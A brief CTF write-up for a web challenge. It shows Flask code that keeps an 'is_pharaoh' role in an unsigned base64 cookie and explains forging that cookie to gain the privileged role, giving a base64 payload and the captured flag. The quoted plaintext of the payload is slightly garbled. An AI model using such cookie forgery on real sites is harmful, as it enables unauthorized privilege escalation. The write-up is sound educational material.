@l34ngyn

<img width="843" height="998" alt="image" src="https://github.com/user-attachments/assets/5932ce87-9f5a-461e-82ec-07290ad6e64d" />

First, we have a archive of source code the web that need exploit to get the flag with role Pharaoh. Try typing `username` and `password` and submit, we are redirected to the page with the message below: 

<img width="721" height="368" alt="image" src="https://github.com/user-attachments/assets/f8adebd0-888a-403b-91ff-b001734cfb19" />

Now, we need to take a closer look at the `main.py` function, the exploit is that the website always defaults to assigning the field `"is_pharaoh": False` to any user.

Source Code:
```py
@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        name = request.form.get("name", "")
        cookie_data = {"name": name, "is_pharaoh": False}
        encoded = base64.b64encode(json.dumps(cookie_data).encode()).decode()

        response = make_response(redirect(url_for("tomb")))
        response.set_cookie("session", encoded)
        return response

    return render_template("index.html")
```

Simply, we just need to edit the cookie_data section, base64 encode it and send it to this website to receive the flag as Pharaoh.

Base64 Encoding Payload:
```
eyJuYW1lIjogImwzNG5neW4iLCAiaXNfcGhhcmFvaCI6IHRydWV9==
```

The payload is the base64 encoding of the string `{"name": ""l34ngyn, "is_pharaoh": True}`, edit the cookie with Cookie-Editor or similar and reload the page, we get the flag.

<img width="666" height="343" alt="image" src="https://github.com/user-attachments/assets/84f2ae6a-9953-407b-9781-f532bdba0edb" />

Flag:
```
bctf{s0_17_w45_wr177en_50_1t_w45_d0n3}
```
